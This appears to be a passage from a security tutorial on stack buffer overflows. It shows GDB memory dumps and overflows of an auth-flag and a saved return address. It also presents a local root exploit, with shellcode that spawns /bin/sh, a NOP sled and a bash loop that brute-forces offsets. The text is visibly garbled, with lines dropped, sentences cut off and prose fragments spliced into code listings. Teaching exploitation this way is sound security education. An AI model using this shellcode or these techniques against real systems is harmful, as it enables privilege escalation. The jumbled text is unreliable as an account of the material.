(password=0xbffff9af 'A' <repeats 30 times>) at\n0xbffff7a0:     0x41414141      0x41414141      0x41414141      0x41414141\n0xbffff7b0:     0x41414141      0x41414141      0x41414141      0x00004141\n0xbffff7c0:     0xb7ff47b0      0x08048510      0xbffff7d8      0x080484bb\n0xbffff7d0:     0xbffff9af      0x08048510      0xbffff838      0xb7eafebc\nContinuing to the next breakpoint found after the strcpy(), these memory\nlocations are examined again. The password_buffer overflowed into the auth_flag,\nchanging its first two bytes to 0x41. The value of 0x00004141 might look backward\nagain, but remember that x86 has little-endian architecture, so it\u2019s supposed to\nlook that way. If you examine each of these four bytes individually, you can see\nhow the memory is actually laid out. Ultimately, the program will treat this\nAfter the overflow, the check_authentication() function will return 16705\ninstead of 0. Since the if statement considers any nonzero value to be authen-\nticated, the program\u2019s execution flow is controlled into the authenticated\nsection. In this example, the auth_flag variable is the execution control point,\nsince overwriting this value is the source of the control.\nBut this is a very contrived example that depends on memory layout of the\nvariables. In auth_overflow2.c, the variables are declared in reverse order.\nThis simple change puts the auth_flag variable before the password_buffer\nin memory. This eliminates the use of the return_value variable as an execu-\ntion control point, since it can no longer be corrupted by an overflow.\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n11              if(strcmp(password_buffer, \"brillig\") == 0)\n13              if(strcmp(password_buffer, \"outgrabe\") == 0)\nBreakpoint 1 at 0x8048421: file auth_overflow2.c, line 9.\nBreakpoint 2 at 0x804846f: file auth_overflow2.c, line 16.\nStarting program: /home/reader/booksrc/a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nBreakpoint 1, check_authentication (password=0xbffff9b7 'A' <repeats 30 times>) at\n0xbffff7c0:      \"?o??\\200????????o???G??\\020\\205\\004\\b?????\\204\\004\\b????\\020\\205\\004\\\n0xbffff7bc:     0x00000000      0xb7fd6ff4      0xbffff880      0xbffff7e8\n0xbffff7cc:     0xb7fd6ff4      0xb7ff47b0      0x08048510      0xbffff7e8\n0xbffff7dc:     0x080484bb      0xbffff9b7      0x08048510      0xbffff848\n0xbffff7ec:     0xb7eafebc      0x00000002      0xbffff874      0xbffff880\nSimilar breakpoints are set, and an examination of memory shows that\nauth_flag (shown in bold above and below) is located before password_buffer\nin memory. This means auth_flag can never be overwritten by an overflow in\nBreakpoint 2, check_authentication (password=0xbffff9b7 'A' <repeats 30 times>)\n0xbffff7bc:     0x00000000      0x41414141      0x41414141      0x41414141\n0xbffff7cc:     0x41414141      0x41414141      0x41414141      0x41414141\n0xbffff7dc:     0x08004141      0xbffff9b7      0x08048510      0xbffff848\n0xbffff7ec:     0xb7eafebc      0x00000002      0xbffff874      0xbffff880\nAs expected, the overflow cannot disturb the auth_flag variable, since it\u2019s\nlocated before the buffer. But another execution control point does exist,\neven though you can\u2019t see it in the C code. It\u2019s conveniently located after all\nthe stack variables, so it can easily be overwritten. This memory is integral to the\noperation of all programs, so it exists in all programs, and when it\u2019s over-\nProgram received signal SIGSEGV, Segmentation fault.\nRecall from the previous chapter that the stack is one of five memory\nsegments used by programs. The stack is a FILO data structure used to\nmaintain execution flow and context for local variables during function calls.\nWhen a function is called, a structure called a stack frame is pushed onto\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n11              if(strcmp(password_buffer, \"brillig\") == 0)\naddress is used to restore EIP. All of this is built\n13              if(strcmp(password_buffer, \"outgrabe\") == 0)\n21                      printf(\"Usage: %s <password>\\n\", argv[0]);\n24              if(check_authentication(argv[1])) {\n25                      printf(\"\\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\");\n26                      printf(\"      Access Granted.\\n\");\n27                      printf(\"-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\");\n29                      printf(\"\\nAccess Denied.\\n\");\nBreakpoint 1 at 0x80484ab: file auth_overflow2.c, line 24.\nBreakpoint 2 at 0x8048421: file auth_overflow2.c, line 9.\nBreakpoint 3 at 0x804846f: file auth_overflow2.c, line 16.\nStarting program: /home/reader/booksrc/a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nBreakpoint 1, main (argc=2, argv=0xbffff874) at auth_overflow2.c:24\n24              if(check_authentication(argv[1])) {\n0xbffff7e0:     0xb8000ce0      0x08048510      0xbffff848      0xb7eafebc\n0xbffff7f0:     0x00000002      0xbffff874      0xbffff880      0xb8001898\n0xbffff800:     0x00000000      0x00000001      0x00000001      0x00000000\n0xbffff810:     0xb7fd6ff4      0xb8000ce0      0x00000000      0xbffff848\n0xbffff820:     0x40f5f7f0      0x48e0fe81      0x00000000      0x00000000\n0xbffff830:     0x00000000      0xb7ff9300      0xb7eafded      0xb8000ff4\n0xbffff840:     0x00000002      0x08048350      0x00000000      0x08048371\n0xbffff850:     0x08048474      0x00000002      0xbffff874      0x08048510\nThe first breakpoint is right before the call to check_authentication()\nin main(). At this point, the stack pointer register (ESP) is 0xbffff7e0, and the\ntop of the stack is shown. This is all part of main()\u2019s stack frame. Continu-\ning to the next breakpoint inside check_authentication(), the output below\nshows ESP is smaller as it moves up the list of memory to make room for\ncheck_authentication()\u2019s stack frame (shown in bold), which is now on the\nstack. After finding the addresses of the auth_flag variable (\u0000) and the variable\npassword_buffer (\u0002), their locations can be seen within the stack frame.\nBreakpoint 2, check_authentication (password=0xbffff9b7 'A' <repeats 30 times>) at\n0xbffff7a0:     0x00000000      0x08049744      0xbffff7b8      0x080482d9\n0xbffff7b0:     0xb7f9f729      0xb7fd6ff4      0xbffff7e8\n\u00020xb7fd6ff4      0xbffff880      0xbffff7e8      0xb7fd6ff4\n0xbffff7d0:     0xb7ff47b0      0x08048510      0xbffff7e8      0x080484bb\n0xbffff7e0:     0xbffff9b7      0x08048510      0xbffff848      0xb7eafebc\n0xbffff7f0:     0x00000002      0xbffff874      0xbffff880      0xb8001898\n0xbffff800:     0x00000000      0x00000001      0x00000001      0x00000000\n0xbffff810:     0xb7fd6ff4      0xb8000ce0      0x00000000      0xbffff848\n0xbffff7c0:      \"?o??\\200????????o???G??\\020\\205\\004\\b?????\\204\\004\\b????\\020\\205\\004\\\nContinuing to the second breakpoint in check_authentication(), a stack\nframe (shown in bold) is pushed onto the stack when the function is called.\nSince the stack grows upward toward lower memory addresses, the stack\npointer is now 64 bytes less at 0xbffff7a0. The size and structure of a stack\nframe can vary greatly, depending on the function and certain compiler\noptimizations. For example, the first 24 bytes of this stack frame are just\npadding put there by the compiler. The local stack variables, auth_flag and\npassword_buffer, are shown at their respective memory locations in the stack\nframe. The auth_flag (\u0000) is shown at 0xbffff7bc, and the 16 bytes of the\nThe stack frame contains more than just the local variables and pad-\nding. Elements of the check_authentication() stack frame are shown below.\nFirst, the memory saved for the local variables is shown in italic. This starts\nat the auth_flag variable at 0xbffff7bc and continues through the end of the\n16-byte password_buffer variable. The next few values on the stack are just\npadding the compiler threw in, plus something called the saved frame pointer.\nIf the program is compiled with the flag -fomit-frame-pointer for optimiza-\ntion, the frame pointer won\u2019t be used in the stack frame. At \u0000 the value\n0x080484bb is the return address of the stack frame, and at \u0002 the address\n0xbffffe9b7 is a pointer to a string containing 30 As. This must be the argu-\n0xbffff7a0:     0x00000000      0x08049744      0xbffff7b8      0x080482d9\n0xbffff7b0:     0xb7f9f729      0xb7fd6ff4      0xbffff7e8      0x00000000\n0xbffff7c0:     0xb7fd6ff4      0xbffff880      0xbffff7e8      0xb7fd6ff4\n0xbffff7d0:     0xb7ff47b0      0x08048510      0xbffff7e8\n\u00020xbffff9b7      0x08048510      0xbffff848      0xb7eafebc\n0xbffff7f0:     0x00000002      0xbffff874      0xbffff880      0xb8001898\n0xbffff800:     0x00000000      0x00000001      0x00000001      0x00000000\n0xbffff810:     0xb7fd6ff4      0xb8000ce0      0x00000000      0xbffff848\n0xbffff9b7:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xbffff9bf:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xbffff9c7:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xbffff9cf:     0x41    0x41    0x41    0x41    0x41    0x41    0x00    0x53\nThe return address in a stack frame can be located by understanding\nhow the stack frame is created. This process begins in the main() function,\n0x08048484 <main+16>:   cmp    DWORD PTR [ebp+8],0x1\n0x0804848a <main+22>:   mov    eax,DWORD PTR [ebp+12]\n0x0804848f <main+27>:   mov    DWORD PTR [esp+4],eax\n0x08048493 <main+31>:   mov    DWORD PTR [esp],0x80485e5\n0x0804849a <main+38>:   call   0x804831c <printf@plt>\n0x080484a6 <main+50>:   call   0x804833c <exit@plt>\n0x080484ab <main+55>:   mov    eax,DWORD PTR [ebp+12]\n0x080484b6 <main+66>:   call   0x8048414 <check_authentication>\n0x080484bd <main+73>:   je     0x80484e5 <main+113>\n0x080484bf <main+75>:   mov    DWORD PTR [esp],0x80485fb\n0x080484c6 <main+82>:   call   0x804831c <printf@plt>\n0x080484cb <main+87>:   mov    DWORD PTR [esp],0x8048619\n0x080484d2 <main+94>:   call   0x804831c <printf@plt>\n0x080484d7 <main+99>:   mov    DWORD PTR [esp],0x8048630\n0x080484de <main+106>:  call   0x804831c <printf@plt>\n0x080484e3 <main+111>:  jmp    0x80484f1 <main+125>\n0x080484e5 <main+113>:  mov    DWORD PTR [esp],0x804864d\n0x080484ec <main+120>:  call   0x804831c <printf@plt>\nNotice the two lines shown in bold on page 131. At this point, the EAX\nregister contains a pointer to the first command-line argument. This is also the\nargument to check_authentication(). This first assembly instruction writes EAX\nto where ESP is pointing (the top of the stack). This starts the stack frame for\ncheck_authentication() with the function argument. The second instruction\nis the actual call. This instruction pushes the address of the next instruction\nto the stack and moves the execution pointer register (EIP) to the start of the\ncheck_authentication() function. The address pushed to the stack is the return\naddress for the stack frame. In this case, the address of the next instruction is\nDump of assembler code for function check_authentication:\n0x08048415 <check_authentication+1>:    mov    ebp,esp\n0x08048417 <check_authentication+3>:    sub    esp,0x38\nExecution will continue into the check_authentication() function as EIP is\nchanged, and the first few instructions (shown in bold above) finish saving\nmemory for the stack frame. These instructions are known as the function\nprologue. The first two instructions are for the saved frame pointer, and the\nthird instruction subtracts 0x38 from ESP. This saves 56 bytes for the local\nvariables of the function. The return address and the saved frame pointer\nare already pushed to the stack and account for the additional 8 bytes of\nWhen the function finishes, the leave and ret instructions remove the\nstack frame and set the execution pointer register (EIP) to the saved return\naddress in the stack frame (\u0000). This brings the program execution back to\nthe next instruction in main() after the function call at 0x080484bb. This process\nhappens every time a function is called in any program.\n0xbffff7a0:     0x00000000      0x08049744      0xbffff7b8      0x080482d9\n0xbffff7b0:     0xb7f9f729      0xb7fd6ff4      0xbffff7e8      0x00000000\n0xbffff7c0:     0xb7fd6ff4      0xbffff880      0xbffff7e8      0xb7fd6ff4\n0xbffff7d0:     0xb7ff47b0      0x08048510      0xbffff7e8\n0xbffff7e0:     0xbffff9b7      0x08048510      0xbffff848      0xb7eafebc\n0xbffff7f0:     0x00000002      0xbffff874      0xbffff880      0xb8001898\n0xbffff800:     0x00000000      0x00000001      0x00000001      0x00000000\n0xbffff810:     0xb7fd6ff4      0xb8000ce0      0x00000000      0xbffff848\nBreakpoint 3, check_authentication (password=0xbffff9b7 'A' <repeats 30 times>)\n0xbffff7a0:     0xbffff7c0      0x080485dc      0xbffff7b8      0x080482d9\n0xbffff7b0:     0xb7f9f729      0xb7fd6ff4      0xbffff7e8      0x00000000\n0xbffff7c0:     0x41414141      0x41414141      0x41414141      0x41414141\n0xbffff7d0:     0x41414141      0x41414141      0x41414141\n0xbffff7e0:     0xbffff9b7      0x08048510      0xbffff848      0xb7eafebc\n0xbffff7f0:     0x00000002      0xbffff874      0xbffff880      0xb8001898\n0xbffff800:     0x00000000      0x00000001      0x00000001      0x00000000\n0xbffff810:     0xb7fd6ff4      0xb8000ce0      0x00000000      0xbffff848\nProgram received signal SIGSEGV, Segmentation fault.\nWhen some of the bytes of the saved return address are overwritten, the\nprogram will still try to use that value to restore the execution pointer regis-\nter (EIP). This usually results in a crash, since execution is essentially jumping\nto a random location. But this value doesn\u2019t need to be random. If the over-\nwrite is controlled, execution can, in turn, be controlled to jump to a specific\nSince so much of hacking is rooted in exploitation and experimentation, the\nability to quickly try different things is vital. The BASH shell and Perl are\ncommon on most machines and are all that is needed to experiment with\nPerl is an interpreted programming language with a print command that\nhappens to be particularly suited to generating long sequences of characters.\nPerl can be used to execute instructions on the command line by using the\nreader@hacking:~/booksrc $ perl -e 'print \"A\" x 20;'\nThis command tells Perl to execute the commands found between the\nsingle quotes\u2014in this case, a single command of print \"A\" x 20;. This com-\nAny character, such as a nonprintable character, can also be printed by\nusing \\x##, where ## is the hexadecimal value of the character. In the following\nexample, this notation is used to print the character A, which has the hexa-\nreader@hacking:~/booksrc $ perl -e 'print \"\\x41\" x 20;'\nIn addition, string concatenation can be done in Perl with a period (.).\nThis can be useful when stringing multiple addresses together.\nreader@hacking:~/booksrc $ perl -e 'print \"A\"x20 . \"BCD\" . \"\\x61\\x66\\x67\\x69\"x2 . \"Z\";'\nAn entire shell command can be executed like a function, returning its\noutput in place. This is done by surrounding the command with parentheses\nand prefixing a dollar sign. Here are two examples:\nreader@hacking:~/booksrc $ $(perl -e 'print \"uname\";')\nreader@hacking:~/booksrc $ una$(perl -e 'print \"m\";')e\nIn each case, the output of the command found between the parentheses\nis substituted for the command, and the command uname is executed. This\nexact command-substitution effect can be accomplished with grave accent\nmarks (`, the tilted single quote on the tilde key). You can use whichever\nsyntax feels more natural for you; however, the parentheses syntax is easier\nreader@hacking:~/booksrc $ u`perl -e 'print \"na\";'`me\nreader@hacking:~/booksrc $ u$(perl -e 'print \"na\";')me\nCommand substitution and Perl can be used in combination to quickly\ngenerate overflow buffers on the fly. You can use this technique to easily test\nthe overflow_example.c program with buffers of precise lengths.\nreader@hacking:~/booksrc $ ./overflow_example $(perl -e 'print \"A\"x30')\n[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'\n[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'\n[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)\n[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAAAAAAAAAAA'\n[AFTER] value is at 0xbffff7f4 and is 1094795585 (0x41414141)\nreader@hacking:~/booksrc $ ./overflow_example $(perl -e 'print \"A\"x20 . \"ABCD\"')\n[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'\n[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'\n[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)\n[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAAABCD'\n[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAABCD'\n[AFTER] value is at 0xbffff7f4 and is 1145258561 (0x44434241)\nIn the output above, GDB is used as a hexadecimal calculator to figure\nout the distance between buffer_two (0xbfffff7e0) and the value variable\n(0xbffff7f4), which turns out to be 20 bytes. Using this distance, the value\nvariable is overwritten with the exact value 0x44434241, since the characters A,\nB, C, and D have the hex values of 0x41, 0x42, 0x43, and 0x44, respectively. The\nfirst character is the least significant byte, due to the little-endian architec-\nture. This means if you wanted to control the value variable with something\nexact, like 0xdeadbeef, you must write those bytes into memory in reverse order.\nreader@hacking:~/booksrc $ ./overflow_example $(perl -e 'print \"A\"x20 . \"\\xef\\xbe\\xad\\xde\"')\n[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'\n[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'\n[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)\n[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAA??'\n[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAA??'\n[AFTER] value is at 0xbffff7f4 and is -559038737 (0xdeadbeef)\nThis technique can be applied to overwrite the return address in the\nauth_overflow2.c program with an exact value. In the example below, we will\noverwrite the return address with a different address in main().\nreader@hacking:~/booksrc $ gcc -g -o auth_overflow2 auth_overflow2.c\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n0x08048484 <main+16>:   cmp    DWORD PTR [ebp+8],0x1\n0x0804848a <main+22>:   mov    eax,DWORD PTR [ebp+12]\n0x0804848f <main+27>:   mov    DWORD PTR [esp+4],eax\n0x08048493 <main+31>:   mov    DWORD PTR [esp],0x80485e5\n0x0804849a <main+38>:   call   0x804831c <printf@plt>\n0x080484a6 <main+50>:   call   0x804833c <exit@plt>\n0x080484ab <main+55>:   mov    eax,DWORD PTR [ebp+12]\n0x080484b6 <main+66>:   call   0x8048414 <check_authentication>\n0x080484bd <main+73>:   je     0x80484e5 <main+113>\n0x080484bf <main+75>:   mov    DWORD PTR [esp],0x80485fb\n0x080484c6 <main+82>:   call   0x804831c <printf@plt>\n0x080484cb <main+87>:   mov    DWORD PTR [esp],0x8048619\n0x080484d2 <main+94>:   call   0x804831c <printf@plt>\n0x080484d7 <main+99>:   mov    DWORD PTR [esp],0x8048630\n0x080484de <main+106>:  call   0x804831c <printf@plt>\n0x080484e3 <main+111>:  jmp    0x80484f1 <main+125>\n0x080484e5 <main+113>:  mov    DWORD PTR [esp],0x804864d\n0x080484ec <main+120>:  call   0x804831c <printf@plt>\nThis section of code shown in bold contains the instructions that display\nthe Access Granted message. The beginning of this section is at 0x080484bf,\nso if the return address is overwritten with this value, this block of instruc-\ntions will be executed. The exact distance between the return address and\nthe start of the password_buffer can change due to different compiler versions\nand different optimization flags. As long as the start of the buffer is aligned\nwith DWORDs on the stack, this mutability can be accounted for by simply\nrepeating the return address many times. This way, at least one of the instances\nwill overwrite the return address, even if it has shifted around due to compiler\nreader@hacking:~/booksrc $ ./auth_overflow2 $(perl -e 'print \"\\xbf\\x84\\x04\\x08\"x10')\nIn the example above, the target address of 0x080484bf is repeated 10 times\nto ensure the return address is overwritten with the new target address. When\nthe check_authentication() function returns, execution jumps directly to the\nnew target address instead of returning to the next instruction after the call.\nThis gives us more control; however, we are still limited to using instructions\nThe notesearch program is vulnerable to a buffer overflow on the line\nif(argc > 1)                        // If there is an arg\nstrcpy(searchstring, argv[1]);   //   that is the search string;\nsearchstring[0] = 0;             //   search string is empty.\nThe notesearch exploit uses a similar technique to overflow a buffer into\nthe return address; however, it also injects its own instructions into memory\nand then returns execution there. These instructions are called shellcode, and\nthey tell the program to restore privileges and open a shell prompt. This is\nespecially devastating for the notesearch program, since it is suid root. Since\nthis program expects multiuser access, it runs under higher privileges so it can\naccess its data file, but the program logic prevents the user from using these\nhigher privileges for anything other than accessing the data file\u2014at least\nBut when new instructions can be injected in and execution can be\ncontrolled with a buffer overflow, the program logic is meaningless. This\ntechnique allows the program to do things it was never programmed to do,\nwhile it\u2019s still running with elevated privileges. This is the dangerous combina-\ntion that allows the notesearch exploit to gain a root shell. Let\u2019s examine the\nreader@hacking:~/booksrc $ gcc -g exploit_notesearch.c\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n5       \"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n6       \"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\n14         bzero(command, 200); // Zero out the new memory.\n16         strcpy(command, \"./notesearch \\'\"); // Start command buffer.\n17         buffer = command + strlen(command); // Set buffer at the end.\n22         ret = (unsigned int) &i - offset; // Set return address.\n24         for(i=0; i < 160; i+=4) // Fill buffer with return address.\n26         memset(buffer, 0x90, 60); // Build NOP sled.\n27         memcpy(buffer+60, shellcode, sizeof(shellcode)-1);\nBreakpoint 1 at 0x80485fa: file exploit_notesearch.c, line 26.\nBreakpoint 2 at 0x8048615: file exploit_notesearch.c, line 27.\nBreakpoint 3 at 0x8048633: file exploit_notesearch.c, line 28.\nThe notesearch exploit generates a buffer in lines 24 through 27 (shown\nabove in bold). The first part is a for loop that fills the buffer with a 4-byte\naddress stored in the ret variable. The loop increments i by 4 each time. This\nvalue is added to the buffer address, and the whole thing is typecast as a\nunsigned integer pointer. This has a size of 4, so when the whole thing is\ndereferenced, the entire 4-byte value found in ret is written.\nBreakpoint 1, main (argc=1, argv=0xbffff894) at exploit_notesearch.c:26\n26         memset(buffer, 0x90, 60); // build NOP sled\n0x804a016:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a026:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a036:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a046:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a056:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a066:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a076:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a086:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a096:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a0a6:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n'\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\n\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\"\nAt the first breakpoint, the buffer pointer shows the result of the for\nloop. You can also see the relationship between the command pointer and\nthe buffer pointer. The next instruction is a call to memset(), which starts at the\nbeginning of the buffer and sets 60 bytes of memory with the value 0x90.\nBreakpoint 2, main (argc=1, argv=0xbffff894) at exploit_notesearch.c:27\n27         memcpy(buffer+60, shellcode, sizeof(shellcode)-1);\n0x804a016:      0x90909090      0x90909090      0x90909090      0x90909090\n0x804a026:      0x90909090      0x90909090      0x90909090      0x90909090\n0x804a036:      0x90909090      0x90909090      0x90909090      0x90909090\n0x804a046:      0x90909090      0x90909090      0x90909090      0xbffff6f6\n0x804a056:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a066:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a076:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a086:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a096:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a0a6:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a008:       \"./notesearch '\", '\\220' <repeats 60 times>, \"\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\n\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\"\nFinally, the call to memcpy() will copy the shellcode bytes into buffer+60.\nBreakpoint 3, main (argc=1, argv=0xbffff894) at exploit_notesearch.c:29\n0x804a016:      0x90909090      0x90909090      0x90909090      0x90909090\n0x804a026:      0x90909090      0x90909090      0x90909090      0x90909090\n0x804a036:      0x90909090      0x90909090      0x90909090      0x90909090\n0x804a046:      0x90909090      0x90909090      0x90909090      0x3158466a\n0x804a056:      0xcdc931db      0x2f685180      0x6868732f      0x6e69622f\n0x804a066:      0x5351e389      0xb099e189      0xbf80cd0b      0xbffff6f6\n0x804a076:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a086:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a096:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a0a6:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a008:       \"./notesearch '\", '\\220' <repeats 60 times>, \"1\u00c01\u00db1\u00c9\\231\u00b0\u00a4\u00cd\\200j\\vXQh//shh/\nbin\\211\u00e3Q\\211\u00e2S\\211\u00e1\u00cd\\200\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\u00b6\u00fb\u00ff\u00bf\"\nNow the buffer contains the desired shellcode and is long enough to over-\nwrite the return address. The difficulty of finding the exact location of the\nreturn address is eased by using the repeated return address technique. But\nthis return address must point to the shellcode located in the same buffer.\nThis means the actual address must be known ahead of time, before it even\ngoes into memory. This can be a difficult prediction to try to make with a\ndynamically changing stack. Fortunately, there is another hacking technique,\ncalled the NOP sled, that can assist with this difficult chicanery. NOP is an\nassembly instruction that is short for no operation. It is a single-byte instruction\nthat does absolutely nothing. These instructions are sometimes used to waste\ncomputational cycles for timing purposes and are actually necessary in the\nSparc processor architecture, due to instruction pipelining. In this case, NOP\ninstructions are going to be used for a different purpose: as a fudge factor.\nWe\u2019ll create a large array (or sled) of these NOP instructions and place it\nbefore the shellcode; then, if the EIP register points to any address found in\nthe NOP sled, it will increment while executing each NOP instruction, one at\na time, until it finally reaches the shellcode. This means that as long as the\nreturn address is overwritten with any address found in the NOP sled, the EIP\nregister will slide down the sled to the shellcode, which will execute properly.\nOn the x86 architecture, the NOP instruction is equivalent to the hex byte\n0x90. This means our completed exploit buffer looks something like this:\nEven with a NOP sled, the approximate location of the buffer in memory\nmust be predicted in advance. One technique for approximating the memory\nlocation is to use a nearby stack location as a frame of reference. By subtract-\ning an offset from this location, the relative address of any variable can be\nstrcpy(command, \"./notesearch \\'\"); // Start command buffer.\nbuffer = command + strlen(command); // Set buffer at the end.\nret = (unsigned int) &i - offset; // Set return address.\nIn the notesearch exploit, the address of the variable i in main()\u2019s stack\nframe is used as a point of reference. Then an offset is subtracted from that\nvalue; the result is the target return address. This offset was previously deter-\nmined to be 270, but how is this number calculated?\nThe easiest way to determine this offset is experimentally. The debugger\nwill shift memory around slightly and will drop privileges when the suid\nroot notesearch program is executed, making debugging much less useful\nSince the notesearch exploit allows an optional command-line argument\nto define the offset, different offsets can quickly be tested.\nreader@hacking:~/booksrc $ gcc exploit_notesearch.c\nHowever, doing this manually is tedious and stupid. BASH also has a for\nloop that can be used to automate this process. The seq command is a simple\nprogram that generates sequences of numbers, which is typically used with\nWhen only two arguments are used, all the numbers from the first argu-\nment to the second are generated. When three arguments are used, the middle\nargument dictates how much to increment each time. This can be used with\nThe function of the for loop should be familiar, even if the syntax is a\nlittle different. The shell variable $i iterates through all the values found in\nthe grave accents (generated by seq). Then everything between the do and\ndone keywords is executed. This can be used to quickly test many different\noffsets. Since the NOP sled is 60 bytes long, and we can return anywhere on\nthe sled, there is about 60 bytes of wiggle room. We can safely increment the\noffset loop with a step of 30 with no danger of missing the sled.\nreader@hacking:~/booksrc $ for i in $(seq 0 30 300)\nWhen the right offset is used, the return address is overwritten with a\nvalue that points somewhere on the NOP sled. When execution tries to return\nto that location, it will just slide down the NOP sled into the injected shellcode\ninstructions. This is how the default offset value was 